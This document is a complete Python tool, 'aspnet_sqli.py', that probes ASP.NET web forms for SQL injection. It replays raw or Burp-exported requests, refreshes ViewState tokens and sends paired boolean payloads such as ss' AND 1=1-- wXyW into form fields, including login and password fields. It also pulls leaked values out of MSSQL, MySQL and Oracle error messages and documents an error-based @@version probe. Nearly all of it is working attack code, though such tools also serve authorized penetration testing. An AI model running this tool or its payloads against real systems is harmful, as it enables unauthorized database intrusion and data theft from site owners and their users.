#!/usr/bin/env python3
"""
aspnet_sqli.py — ASP.NET SQL Injection Tester
Uses boolean-pair differential analysis to eliminate false positives.

TRUE/FALSE payload pairs in the payload file are tested together.
Only parameters where TRUE and FALSE produce DIFFERENT responses
are flagged as confirmed injection points.

Pair format in payload file:
    TRUE:  ss' AND 1=1-- wXyW
    FALSE: ss' AND 1=2-- wXyW

Usage:
    python3 aspnet_sqli.py -r req.txt -p payloads.txt [options]
    python3 aspnet_sqli.py -x burp.xml -p payloads.txt --rotate-params
"""

import argparse
import base64
import html as htmlmod
import re
import sys
import time
import urllib.parse
import xml.etree.ElementTree as ET
from dataclasses import dataclass, field
from typing import Optional
from collections import defaultdict

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── Colours ───────────────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def red(s):    return f"{C.RED}{s}{C.RESET}"
def green(s):  return f"{C.GREEN}{s}{C.RESET}"
def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
def bold(s):   return f"{C.BOLD}{s}{C.RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────
DEFAULT_TOKEN_FIELDS = [
    "__VIEWSTATE",
    "__EVENTVALIDATION",
    "__VIEWSTATEGENERATOR",
    "__EVENTTARGET",
    "__EVENTARGUMENT",
]

SKIP_PARAM_SUFFIXES = (
    "$ctl08", "$Button", "$Submit", "$LoginButton",
)


# ── Payload file format ───────────────────────────────────────────────────────
@dataclass
class PayloadPair:
    """
    A TRUE/FALSE pair. Both payloads must be the same length to be
    immune to reflection-based false positives.
    In single-payload mode the false_payload is None.
    """
    true_payload:  str
    false_payload: Optional[str] = None
    label:         str = ""

    @property
    def is_pair(self) -> bool:
        return self.false_payload is not None

    @property
    def length_matched(self) -> bool:
        if not self.is_pair:
            return False
        return len(self.true_payload) == len(self.false_payload)


def parse_payload_file(path: str) -> list[PayloadPair]:
    """
    Parse payload file. Pairs are declared with TRUE:/FALSE: prefixes.
    Lines without prefix are treated as single probes (legacy mode).

    Format:
        # comment
        TRUE:  ss' AND 1=1-- wXyW
        FALSE: ss' AND 1=2-- wXyW

        # single probe (no pairing)
        ss' AND 1=CONVERT(int,@@version)-- wXyW
    """
    pairs   = []
    pending_true = None
    pending_label = ""

    with open(path) as f:
        for raw_line in f:
            line = raw_line.strip()
            if not line or line.startswith("#"):
                if line.startswith("# ──") or line.startswith("# =="):
                    pending_label = line.lstrip("# ─=").strip()
                continue

            if line.upper().startswith("TRUE:"):
                pending_true  = line[5:].strip()
            elif line.upper().startswith("FALSE:") and pending_true is not None:
                false_payload = line[6:].strip()
                pairs.append(PayloadPair(
                    true_payload  = pending_true,
                    false_payload = false_payload,
                    label         = pending_label,
                ))
                pending_true  = None
                pending_label = ""
            else:
                if pending_true is not None:
                    # Orphaned TRUE without FALSE — treat as single
                    pairs.append(PayloadPair(true_payload=pending_true,
                                             label=pending_label))
                    pending_true = None
                pairs.append(PayloadPair(true_payload=line,
                                         label=pending_label))

    if pending_true is not None:
        pairs.append(PayloadPair(true_payload=pending_true,
                                 label=pending_label))

    return pairs


# ── Parsed request ────────────────────────────────────────────────────────────
@dataclass
class ParsedRequest:
    method:  str
    path:    str
    host:    str
    scheme:  str
    headers: dict
    cookies: dict
    body:    str
    params:  dict
    label:   str = ""


def full_url(req: ParsedRequest) -> str:
    return f"{req.scheme}://{req.host}{req.path}"


def _parse_raw_request(raw: str, scheme: str = "https",
                        label: str = "") -> ParsedRequest:
    raw   = raw.replace("\r\n", "\n").replace("\r", "\n")
    head, body = (raw.split("\n\n", 1) + [""])[:2]
    lines = head.splitlines()
    parts = lines[0].strip().split()
    method = parts[0].upper() if parts else "GET"
    path   = parts[1] if len(parts) > 1 else "/"

    headers = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()

    host = headers.pop("Host", "")
    cookies = {}
    for part in headers.pop("Cookie", "").split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()

    for auto in ("Content-Length", "Content-Type",
                 "Connection", "Accept-Encoding"):
        headers.pop(auto, None)

    body = body.strip()
    params = {}
    if body:
        for kv in body.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                params[urllib.parse.unquote_plus(k)] = \
                    urllib.parse.unquote_plus(v)
            else:
                params[urllib.parse.unquote_plus(kv)] = ""

    return ParsedRequest(
        method=method, path=path, host=host, scheme=scheme,
        headers=headers, cookies=cookies, body=body,
        params=params, label=label or path,
    )


def parse_request_file(path: str, scheme: str = "https") -> ParsedRequest:
    with open(path, "rb") as f:
        raw = f.read().decode("utf-8", errors="replace")
    return _parse_raw_request(raw, scheme=scheme, label=path)


# ── Burp XML parser ───────────────────────────────────────────────────────────
def parse_burp_xml(xml_path: str,
                   methods: Optional[list[str]] = None,
                   min_params: int = 1) -> list[ParsedRequest]:
    methods = [m.upper() for m in (methods or ["POST", "PUT", "PATCH"])]
    try:
        tree = ET.parse(xml_path)
    except ET.ParseError as e:
        print(red(f"[!] Failed to parse XML: {e}"))
        sys.exit(1)

    root  = tree.getroot()
    items = root.findall("item")
    print(f"[*] Burp XML: {len(items)} items in {xml_path}")

    results = []
    for i, item in enumerate(items, 1):
        method   = (item.findtext("method")   or "").upper()
        protocol = (item.findtext("protocol") or "https").lower()
        host     = (item.findtext("host")     or "")
        path     = (item.findtext("path")     or "/")

        if method not in methods:
            continue

        req_el = item.find("request")
        if req_el is None or not req_el.text:
            continue

        raw = req_el.text.strip()
        if req_el.get("base64") == "true":
            try:
                raw = base64.b64decode(raw).decode("utf-8", errors="replace")
            except Exception:
                continue

        label = f"item#{i} {method} {host}{path}"
        req   = _parse_raw_request(raw, scheme=protocol, label=label)
        if not req.host:
            req.host   = host
            req.scheme = protocol

        if len(req.params) < min_params:
            continue

        results.append(req)

    print(f"[*] {len(results)} {'/'.join(methods)} requests "
          f"with ≥{min_params} body params\n")
    return results


# ── Token handling ────────────────────────────────────────────────────────────
def extract_tokens(html_text: str, token_fields: list[str]) -> dict:
    tokens = {}
    for f in token_fields:
        for pat in [
            rf'<input[^>]+name=["\']?{re.escape(f)}["\']?[^>]+'
            rf'value=["\']([^"\']*)["\']',
            rf'<input[^>]+value=["\']([^"\']*)["\'][^>]+'
            rf'name=["\']?{re.escape(f)}["\']?',
        ]:
            m = re.search(pat, html_text, re.IGNORECASE)
            if m:
                tokens[f] = m.group(1)
                break
    return tokens


def get_fresh_tokens(session, req, token_fields, timeout, verify):
    if not token_fields:
        return {}
    try:
        r = session.get(full_url(req), headers=req.headers,
                        timeout=timeout, verify=verify,
                        allow_redirects=True)
        return extract_tokens(r.text, token_fields)
    except requests.RequestException as e:
        print(red(f"[!] Token refresh failed: {e}"))
        return None


# ── Injectable param discovery ────────────────────────────────────────────────
def get_injectable_params(req, token_fields, extra_skip=None):
    skip = set(token_fields) | set(extra_skip or [])
    out  = []
    for name in req.params:
        if name in skip:
            continue
        if any(name.endswith(s) for s in SKIP_PARAM_SUFFIXES):
            continue
        if name.startswith("DX"):
            continue
        out.append(name)
    return out


# ── Request builder ───────────────────────────────────────────────────────────
def build_body(base_params, inject_param, payload,
               mirror_param=None, overrides=None):
    p = dict(base_params)
    if overrides:
        p.update(overrides)
    p[inject_param] = payload
    if mirror_param and mirror_param in p:
        p[mirror_param] = payload
    return p


# ── Hint extraction ───────────────────────────────────────────────────────────
def extract_hint(body: str) -> str:
    decoded = htmlmod.unescape(body)
    checks  = [
        (r"Conversion failed when converting (?:the )?(?:nvarchar|varchar|"
         r"uniqueidentifier|datetime|ntext|text) value '([^']{1,500})'"
         r" to data type",
         lambda m: f"EXTRACTED(MSSQL): {m.group(1)}"),
        (r"XPATH syntax error: '([^']{1,300})'",
         lambda m: f"EXTRACTED(MySQL): {m.group(1)}"),
        (r"(ORA-\d{4,5}[^\n<]{0,150})",
         lambda m: m.group(1).strip()),
        (r"A potentially dangerous Request\.Form value",
         lambda m: "[RequestValidation blocked — CHAR-encode payload]"),
        (r"(Incorrect syntax near|Unclosed quotation mark|"
         r"arithmetic overflow|Invalid column name|Invalid object name|"
         r"You have an error in your SQL syntax)[^\n<]{0,200}",
         lambda m: m.group(0).strip()),
        (r"(SqlException|OleDbException)[^\n<]{0,120}",
         lambda m: f"[noise] {m.group(0).strip()}"),
    ]
    for pat, fmt in checks:
        m = re.search(pat, decoded, re.IGNORECASE)
        if m:
            return fmt(m)
    return ""


# ── Single HTTP request ───────────────────────────────────────────────────────
def do_request(session, req, params, timeout, verify):
    try:
        t0 = time.time()
        r  = session.request(
            method=req.method, url=full_url(req),
            headers=req.headers, data=params,
            timeout=timeout, verify=verify, allow_redirects=False,
        )
        elapsed = int((time.time() - t0) * 1000)
        hint    = extract_hint(r.text) if r.status_code >= 400 else ""
        return r.status_code, len(r.content), elapsed, hint, r.text
    except requests.Timeout:
        return 0, 0, timeout * 1000, "TIMEOUT", ""
    except requests.RequestException as e:
        return 0, 0, 0, str(e), ""


# ── Baseline ──────────────────────────────────────────────────────────────────
def confirm_baseline(session, req, token_fields, baseline_string,
                     timeout, verify):
    tokens = get_fresh_tokens(session, req, token_fields, timeout, verify)
    if tokens is None:
        return None
    params = {**req.params, **tokens}
    try:
        t0 = time.time()
        r  = session.request(
            method=req.method, url=full_url(req),
            headers=req.headers, data=params,
            timeout=timeout, verify=verify, allow_redirects=False,
        )
        elapsed = int((time.time() - t0) * 1000)
    except requests.RequestException as e:
        print(red(f"    [!] Baseline failed: {e}"))
        return None

    sc  = r.status_code
    sz  = len(r.content)
    s   = green(str(sc)) if sc < 400 else red(str(sc))
    print(f"    Status:{s}  Size:{sz}b  Time:{elapsed}ms")

    if sc >= 500:
        print(red("    [!] Baseline 500 — cookies likely expired."))
        return None
    if baseline_string and baseline_string not in r.text:
        print(yellow(f"    [!] '{baseline_string}' not in response."))
        return None

    print(green("    [+] Baseline confirmed."))
    return sc, sz


# ── Core: test one payload pair against one param ─────────────────────────────
@dataclass
class PairResult:
    pair:          PayloadPair
    true_sc:       int
    true_sz:       int
    true_ms:       int
    true_hint:     str
    false_sc:      int = 0
    false_sz:      int = 0
    false_ms:      int = 0
    false_hint:    str = ""

    @property
    def confirmed(self) -> bool:
        """
        A pair is confirmed injection when TRUE and FALSE produce
        DIFFERENT responses (status or size).
        For single probes: any deviation from baseline.
        """
        if not self.pair.is_pair:
            return False   # singles never auto-confirmed
        return (self.true_sc != self.false_sc or
                self.true_sz != self.false_sz)

    @property
    def deviation_type(self) -> str:
        if not self.pair.is_pair:
            return "single"
        if self.true_sc != self.false_sc:
            return f"status({self.true_sc}≠{self.false_sc})"
        if self.true_sz != self.false_sz:
            delta = self.true_sz - self.false_sz
            return f"size(Δ{delta:+d}b)"
        return "none"


def run_pair(session, req, pair: PayloadPair,
             inject_param, baseline_status, baseline_size,
             token_fields, mirror_param, overrides,
             timeout, verify, delay) -> PairResult:
    """Send TRUE payload (and FALSE if paired). Return results."""

    # TRUE request
    tokens = get_fresh_tokens(session, req, token_fields, timeout, verify) or {}
    params = build_body(req.params, inject_param, pair.true_payload,
                        mirror_param=mirror_param, overrides=overrides)
    params.update(tokens)
    t_sc, t_sz, t_ms, t_hint, t_body = do_request(
        session, req, params, timeout, verify)
    time.sleep(delay)

    result = PairResult(pair=pair,
                        true_sc=t_sc, true_sz=t_sz,
                        true_ms=t_ms, true_hint=t_hint)

    if not pair.is_pair:
        return result

    # FALSE request
    tokens = get_fresh_tokens(session, req, token_fields, timeout, verify) or {}
    params = build_body(req.params, inject_param, pair.false_payload,
                        mirror_param=mirror_param, overrides=overrides)
    params.update(tokens)
    f_sc, f_sz, f_ms, f_hint, _ = do_request(
        session, req, params, timeout, verify)
    time.sleep(delay)

    result.false_sc   = f_sc
    result.false_sz   = f_sz
    result.false_ms   = f_ms
    result.false_hint = f_hint
    return result


# ── Payload loop for one inject param ────────────────────────────────────────
def run_param(session, req, pairs: list[PayloadPair],
              inject_param, baseline_status, baseline_size,
              token_fields, mirror_param, overrides, args) -> list[dict]:

    mirror = mirror_param
    if args.rotate_params and "Password" in inject_param and not mirror:
        for k in req.params:
            if "Confirm" in k and "Password" in k:
                mirror = k
                break

    n_pairs   = sum(1 for p in pairs if p.is_pair)
    n_singles = len(pairs) - n_pairs
    print(bold(f"\n  ▶ {inject_param}"
               + (f"  mirror→{mirror}" if mirror else "")
               + f"  [{n_pairs} pairs + {n_singles} singles]"))

    # Column header
    true_sc_h  = "sc"
    true_sz_h  = "sz"
    false_sc_h = "sc"
    false_sz_h = "sz"
    print(f"\n  {'#':<4} TRUE {true_sc_h}/{true_sz_h:<5}  "
          f"FALSE {false_sc_h}/{false_sz_h:<5}  "
          f"{'Match?':<22} Payload")
    print(f"  {'─'*90}")

    confirmed = []
    singles   = []

    for i, pair in enumerate(pairs, 1):
        result = run_pair(
            session, req, pair, inject_param,
            baseline_status, baseline_size,
            token_fields, mirror, overrides,
            args.timeout, args.verify, args.delay
        )

        t_sc_s = (green if result.true_sc < 400 else red)(str(result.true_sc))
        f_sc_s = (green if result.false_sc < 400 else red)(str(result.false_sc)) \
                 if pair.is_pair else "    -"

        if pair.is_pair:
            if result.confirmed:
                match_s = red(f"DIFF {result.deviation_type}")
            elif not pair.length_matched:
                match_s = yellow("SAME (len≠)")
            else:
                match_s = green("same ✓")
        else:
            # Single — flag if deviates from baseline
            dev = (result.true_sc != baseline_status or
                   result.true_sz != baseline_size)
            match_s = yellow("deviate") if dev else green("clean")

        display = (pair.true_payload[:45] + "…") \
                  if len(pair.true_payload) > 45 else pair.true_payload

        print(f"  {i:<4} {t_sc_s} {result.true_sz:<6} "
              f"{f_sc_s} {result.false_sz if pair.is_pair else '-':<6} "
              f"{match_s:<22} {display}")

        if result.true_hint:
            print(f"       {yellow('└T ' + result.true_hint)}")
        if result.false_hint:
            print(f"       {yellow('└F ' + result.false_hint)}")

        if result.confirmed:
            confirmed.append({
                "url":    full_url(req), "label": req.label,
                "param":  inject_param,
                "pair_n": i,
                "true_payload":  pair.true_payload,
                "false_payload": pair.false_payload,
                "true_sc":  result.true_sc,  "true_sz":  result.true_sz,
                "false_sc": result.false_sc, "false_sz": result.false_sz,
                "deviation": result.deviation_type,
                "hint":   result.true_hint or result.false_hint,
                "confirmed": True,
            })
        elif not pair.is_pair:
            dev = (result.true_sc != baseline_status or
                   result.true_sz != baseline_size)
            if dev:
                singles.append({
                    "url": full_url(req), "label": req.label,
                    "param": inject_param,
                    "pair_n": i,
                    "true_payload": pair.true_payload,
                    "false_payload": None,
                    "true_sc": result.true_sc, "true_sz": result.true_sz,
                    "deviation": f"vs baseline({baseline_status}/{baseline_size}b)",
                    "hint": result.true_hint,
                    "confirmed": False,
                })

    c = len(confirmed)
    s = len(singles)
    print(f"\n  → {c} confirmed injection pair(s)"
          + (f", {s} single deviations (unconfirmed)" if s else ""))

    return confirmed + singles


# ── Test one request ──────────────────────────────────────────────────────────
def test_request(session, req, pairs, args,
                 token_fields, overrides) -> list[dict]:
    print(bold(f"\n{'═'*95}"))
    print(bold(f"  {req.method} {full_url(req)}"))
    print(bold(f"  {req.label}"))
    print(bold(f"{'═'*95}"))

    if args.rotate_params:
        inject_params = get_injectable_params(
            req, token_fields, extra_skip=args.skip_param)
        if not inject_params:
            print(yellow("  [!] No injectable params — skipping"))
            return []
        print(f"  Params : {inject_params}")
    else:
        inject_params = [args.inject_param]
        if args.inject_param not in req.params:
            print(yellow(f"  [!] '{args.inject_param}' not found — skipping"))
            return []

    print(bold("\n  [*] Baseline..."))
    baseline = confirm_baseline(
        session, req, token_fields,
        args.baseline_string, args.timeout, args.verify)
    if not baseline:
        print(yellow("  [!] Baseline failed — skipping"))
        return []
    b_sc, b_sz = baseline

    all_findings = []
    for inject_param in inject_params:
        findings = run_param(
            session, req, pairs, inject_param, b_sc, b_sz,
            token_fields, args.mirror_param, overrides, args)
        all_findings.extend(findings)

    return all_findings


# ── Final summary ─────────────────────────────────────────────────────────────
def print_summary(all_findings: list[dict], total_requests: int):
    confirmed = [f for f in all_findings if f["confirmed"]]
    singles   = [f for f in all_findings if not f["confirmed"]]

    print(bold(f"\n\n{'█'*95}"))
    print(bold(f"  SUMMARY — {total_requests} request(s) | "
               f"{len(confirmed)} confirmed | "
               f"{len(singles)} unconfirmed single deviations"))
    print(bold(f"{'█'*95}\n"))

    if confirmed:
        # Group by url+param
        grouped = defaultdict(list)
        for f in confirmed:
            grouped[(f["url"], f["param"])].append(f)

        print(bold(red(f"  ✔ CONFIRMED INJECTION POINTS ({len(grouped)}):\n")))
        for (url, param), findings in grouped.items():
            print(bold(f"  ┌─ {url}"))
            print(f"  │  Parameter : {param}")
            print(f"  │  Pairs hit : {len(findings)}")
            for f in findings:
                print(f"  │  Pair #{f['pair_n']}")
                print(f"  │    TRUE  ({f['true_sc']}/{f['true_sz']}b) : "
                      f"{f['true_payload']}")
                print(f"  │    FALSE ({f['false_sc']}/{f['false_sz']}b) : "
                      f"{f['false_payload']}")
                print(f"  │    Delta : {f['deviation']}")
                if f["hint"]:
                    print(f"  │    Hint  : {f['hint']}")
            print(f"  └{'─'*60}\n")
    else:
        print(green("  [+] No confirmed injection pairs.\n"))

    if singles:
        print(yellow(f"  ⚠ UNCONFIRMED SINGLE DEVIATIONS ({len(singles)}) "
                     f"— add FALSE payloads to confirm:\n"))
        for f in singles:
            print(f"  ┌─ {f['url']}")
            print(f"  │  Parameter : {f['param']}")
            print(f"  │  Payload   : {f['true_payload']}")
            print(f"  │  Deviation : {f['deviation']}")
            if f["hint"]:
                print(f"  │  Hint      : {f['hint']}")
            print(f"  └{'─'*60}")


# ── Main ──────────────────────────────────────────────────────────────────────
def run(args):
    proxy   = None if args.no_proxy else args.proxy
    proxies = {"http": proxy, "https": proxy} if proxy else {}
    scheme  = "http" if args.http else "https"

    token_fields = [t.strip() for t in args.token_fields.split(",")
                    if t.strip()] if args.token_fields else DEFAULT_TOKEN_FIELDS

    overrides = {}
    for kv in args.set_param:
        if "=" in kv:
            k, v = kv.split("=", 1)
            overrides[k] = v

    print(bold(cyan("\n=== aspnet_sqli.py (boolean-pair mode) ===")))
    print(f"  Proxy        : {proxy or 'direct'}")
    print(f"  Token fields : {token_fields or 'none'}")
    print(f"  Rotate params: {args.rotate_params}")

    try:
        pairs = parse_payload_file(args.payloads)
    except FileNotFoundError:
        print(red(f"[!] Payload file not found: {args.payloads}"))
        sys.exit(1)

    n_pairs   = sum(1 for p in pairs if p.is_pair)
    n_singles = len(pairs) - n_pairs
    print(f"  Payloads     : {n_pairs} pairs + {n_singles} singles "
          f"from {args.payloads}")

    unmatched = [p for p in pairs
                 if p.is_pair and not p.length_matched]
    if unmatched:
        print(yellow(f"\n  [!] {len(unmatched)} pair(s) have mismatched "
                     f"payload lengths — vulnerable to reflection FP:"))
        for p in unmatched:
            print(yellow(f"      T({len(p.true_payload)}): {p.true_payload[:50]}"))
            print(yellow(f"      F({len(p.false_payload)}): {p.false_payload[:50]}"))

    session = requests.Session()
    session.proxies.update(proxies)

    if args.burp_xml:
        test_requests = parse_burp_xml(
            args.burp_xml,
            methods=args.xml_methods.upper().split(","),
            min_params=args.min_params,
        )
        if args.cookies:
            for part in args.cookies.split(";"):
                if "=" in part:
                    k, v = part.strip().split("=", 1)
                    session.cookies.set(k.strip(), v.strip())
    else:
        req = parse_request_file(args.request, scheme=scheme)
        session.cookies.update(req.cookies)
        test_requests = [req]

    if not test_requests:
        print(red("[!] No requests to test."))
        sys.exit(1)

    print(f"\n[*] Testing {len(test_requests)} request(s)\n")

    all_findings = []
    for req in test_requests:
        if not args.burp_xml:
            session.cookies.clear()
            session.cookies.update(req.cookies)
        findings = test_request(
            session, req, pairs, args, token_fields, overrides)
        all_findings.extend(findings)

    print_summary(all_findings, len(test_requests))


# ── CLI ───────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="ASP.NET SQLi tester — boolean-pair differential analysis",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Payload file format:
  TRUE:  ss' AND 1=1-- wXyW
  FALSE: ss' AND 1=2-- wXyW

  TRUE:  ss' AND 'a'='a'--x
  FALSE: ss' AND 'a'='b'--x

  # Single probe (legacy — not pair-confirmed)
  ss' AND 1=CONVERT(int,@@version)-- wXyW

Examples:
  python3 aspnet_sqli.py -r req.txt -p payloads.txt
  python3 aspnet_sqli.py -x burp.xml -p payloads.txt --rotate-params
  python3 aspnet_sqli.py -r req.txt -p payloads.txt \\
      --inject-param "ctl00$contentholder$loginForm$UserName"
        """
    )
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("-r", "--request",  help="Raw HTTP request file")
    src.add_argument("-x", "--burp-xml", help="Burp Suite XML export")

    ap.add_argument("-p", "--payloads", required=True)
    ap.add_argument("--inject-param",
                    default="ctl00$MainContent$Password")
    ap.add_argument("--rotate-params", action="store_true")
    ap.add_argument("--skip-param", metavar="PARAM",
                    action="append", default=[])
    ap.add_argument("--mirror-param",  default=None)
    ap.add_argument("--set-param", metavar="KEY=VALUE",
                    action="append", default=[])
    ap.add_argument("--baseline-string", default="")
    ap.add_argument("--token-fields",
                    default=",".join(DEFAULT_TOKEN_FIELDS))
    ap.add_argument("--xml-methods",  default="POST,PUT,PATCH")
    ap.add_argument("--min-params",   type=int,   default=1)
    ap.add_argument("--cookies",      default="")
    ap.add_argument("--proxy",        default="http://127.0.0.1:8080")
    ap.add_argument("--no-proxy",     action="store_true")
    ap.add_argument("--http",         action="store_true")
    ap.add_argument("--verify",       action="store_true")
    ap.add_argument("--timeout",      type=int,   default=90)
    ap.add_argument("--delay",        type=float, default=0.5)

    args = ap.parse_args()
    run(args)


if __name__ == "__main__":
    main()
